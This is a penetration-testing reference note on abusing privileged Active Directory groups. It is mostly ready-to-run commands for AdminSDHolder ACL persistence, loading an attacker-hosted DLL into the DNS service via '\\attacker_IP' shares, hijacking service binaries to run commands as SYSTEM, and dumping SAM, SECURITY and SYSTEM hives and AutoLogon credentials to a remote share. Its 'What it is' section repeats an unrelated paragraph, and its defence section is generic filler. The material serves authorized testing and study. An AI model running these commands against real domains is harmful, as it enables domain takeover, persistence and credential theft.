---
title: Active Directory - Groups
type: technique
tags: [active-directory, enumeration, reference-import, windows]
phase: enumeration
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Active Directory - Groups

## What it is

If you do not want modified ACLs to be overwritten every hour, you should change ACL template on the object `CN=AdminSDHolder,CN=System` or set `adminCount` attribute to `0` for the required object.

## How it works

AD contains built-in privileged groups (Domain Admins, Enterprise Admins, Schema Admins, Backup Operators) whose members are protected by `AdminSDHolder`, a template that SDProp reapplies to all protected objects hourly. Attackers target these groups because membership confers high-privilege rights across the domain; they also exploit the `adminCount=1` attribute, which is never automatically cleared when a user leaves a protected group, leaving stale accounts with tightened ACLs that may still hold lateral-movement value. Adding a backdoor account to `AdminSDHolder` provides persistent elevated permissions that survive periodic ACL audits.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

## Dangerous Built-in Groups Usage

If you do not want modified ACLs to be overwritten every hour, you should change ACL template on the object `CN=AdminSDHolder,CN=System` or set `adminCount` attribute to `0` for the required object.

> The AdminCount attribute is set to `1` automatically when a user is assigned to any privileged group, but it is never automatically unset when the user is removed from these group(s).

Find users with `AdminCount=1`.

```ps1
netexec ldap 10.10.10.10 -u username -p password --admin-count
# or
bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 get search --filter '(admincount=1)' --attr sAMAccountName
# or
python ldapdomaindump.py -u example.com\john -p pass123 -d ';' 10.10.10.10
jq -r '.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]' domain_users.json
# or
Get-ADUser -LDAPFilter "(objectcategory=person)(samaccountname=*)(admincount=1)"
Get-ADGroup -LDAPFilter "(objectcategory=group) (admincount=1)"
# or
([adsisearcher]"(AdminCount=1)").findall()
```

## AdminSDHolder Attribute

> The Access Control List (ACL) of the AdminSDHolder object is used as a template to copy permissions to all "protected groups" in Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins.

If you modify the permissions of **AdminSDHolder**, that permission template will be pushed out to all protected accounts automatically by `SDProp` (in an hour).

E.g: if someone tries to delete this user from the Domain Admins in an hour or less, the user will be back in the group.

* Windows/Linux:

```ps1
bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 add genericAll 'CN=AdminSDHolder,CN=System,DC=example,DC=lab' john

# Clean up after
bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 remove genericAll 'CN=AdminSDHolder,CN=System,DC=example,DC=lab' john
```

* Windows only:

```ps1
# Add a user to the AdminSDHolder group:
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity username -Rights All -Verbose

# Right to reset password for toto using the account titi
Add-ObjectACL -TargetSamAccountName toto -PrincipalSamAccountName titi -Rights ResetPassword

# Give all rights
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName toto -Verbose -Rights All
```

## DNS Admins Group

> It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM).

:warning: Require privileges to restart the DNS service.

* Enumerate members of DNSAdmins group
    * Windows/Linux:

```ps1
bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 get object DNSAdmins --attr msds-memberTransitive
```

    * Windows only:

```ps1
Get-NetGroupMember -GroupName "DNSAdmins"
Get-ADGroupMember -Identity DNSAdmins
```

* Change dll loaded by the DNS service

```ps1
# with RSAT
dnscmd <servername> /config /serverlevelplugindll \\attacker_IP\dll\mimilib.dll
dnscmd 10.10.10.11 /config /serverlevelplugindll \\10.10.10.10\exploit\privesc.dll

# with DNSServer module
$dnsettings = Get-DnsServerSetting -ComputerName <servername> -Verbose -All
$dnsettings.ServerLevelPluginDll = "\attacker_IP\dll\mimilib.dll"
Set-DnsServerSetting -InputObject $dnsettings -ComputerName <servername> -Verbose
```

* Check the previous command success

```ps1
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
```

* Restart DNS

```ps1
sc \\dc01 stop dns
sc \\dc01 start dns
```

## Server Operators Group

> Members of `BUILTIN\Server Operators` (SID `S-1-5-32-549`) can log on to, shut down, and manage
> services on Domain Controllers. Because services run as `LocalSystem`, the right to reconfigure a
> service binary is a direct path to SYSTEM on the DC (domain compromise). Not a "protected" group by
> default and often overlooked, so a foothold account that lands here is a fast escalation.

Detect membership: `whoami /all` (look for `S-1-5-32-549`) or a BloodHound `MemberOf` edge.

The catch: Server Operators do **not** automatically get `SERVICE_CHANGE_CONFIG` on every service;
each service's DACL decides. Hardened services (e.g. Spooler post-PrintNightmare) deny it, while
third-party/vendor and cloud-guest-agent services (AWS/Azure agents) often grant it. `sc query`
(SCM enumerate) may be denied, so enumerate service names from the registry and read individual DACLs:

```ps1
# List service ImagePaths outside the Windows dir (candidate third-party services)
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services |
  ForEach-Object { $ip=(Get-ItemProperty $_.PSPath -Name ImagePath -EA SilentlyContinue).ImagePath
    if ($ip -and $ip -notmatch 'System32|SystemRoot|\\Windows\\') { "$($_.PSChildName) => $ip" } }

sc.exe sdshow <svc>     # need the group's ACE to include DC (SERVICE_CHANGE_CONFIG):
#   (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)     SO=Server Operators, DC=change config
```

Reconfigure the service binary and start it to run a command as SYSTEM, then restore:

```ps1
sc.exe config <svc> binPath= "cmd.exe /c <command>"   # inline cmd; .bat/net-add are Defender-flagged
sc.exe start  <svc>                                     # returns 1053 (timeout) but the command runs
sc.exe config <svc> binPath= "\"C:\Program Files\Vendor\agent.exe\""   # restore
```

Full technique, DACL/SDDL breakdown, and Defender/service-state gotchas: [[server-operators-privesc]].

## Schema Admins Group

> The Schema Admins group is a security group in Microsoft Active Directory that provides its members with the ability to make changes to the schema of an Active Directory forest. The schema defines the structure of the Active Directory database, including the attributes and object classes that are used to store information about users, groups, computers, and other objects in the directory.

## Backup Operators Group

> Members of the Backup Operators group can back up and restore all files on a computer, regardless of the permissions that protect those files. Backup Operators also can log on to and shut down the computer. This group cannot be renamed, deleted, or moved. By default, this built-in group has no members, and it can perform backup and restore operations on domain controllers.

This groups grants the following privileges :

* SeBackup privileges
* SeRestore privileges

Get members of the group:

* Windows/Linux:

```ps1
bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 get object "Backup Operators" --attr msds-memberTransitive
```

* Windows only:

```ps1
PowerView> Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

Enable privileges using [giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)

```ps1
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

Retrieve sensitive files

```ps1
Copy-FileSeBackupPrivilege C:\Users\Administrator\flag.txt C:\Users\Public\flag.txt -Overwrite
```

Retrieve content of AutoLogon in the `HKLM\SOFTWARE` hive

```ps1
$reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', 'dc.htb.local',[Microsoft.Win32.RegistryView]::Registry64)
$winlogon = $reg.OpenSubKey('SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon')
$winlogon.GetValueNames() | foreach {"$_ : $(($winlogon).GetValue($_))"}
```

Retrieve `SAM`,`SECURITY` and `SYSTEM` hives

* [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

```ps1
nxc smb 10.10.10.10 -u user -p password -M backup_operator
```

* [mpgn/BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA)

```ps1
.\BackupOperatorToDA.exe -t \\dc1.lab.local -u user -p pass -d domain -o \\10.10.10.10\SHARE\
```

* [improsec/BackupOperatorToolkit](https://github.com/improsec/BackupOperatorToolkit)

```ps1
.\BackupOperatorToolkit.exe DUMP \\PATH\To\Dump \\TARGET.DOMAIN.DK
```

## References

* [Poc’ing Beyond Domain Admin - Part 1 - cube0x0](https://cube0x0.github.io/Pocing-Beyond-DA/)
* [WHAT’S SPECIAL ABOUT THE BUILTIN ADMINISTRATOR ACCOUNT? - 21/05/2012 - MORGAN SIMONSEN](https://morgansimonsen.com/2012/05/21/whats-special-about-the-builtin-administrator-account-12/)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

- [[john]]
- [[netexec]]
- Also uses (no dedicated page yet): PowerView

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
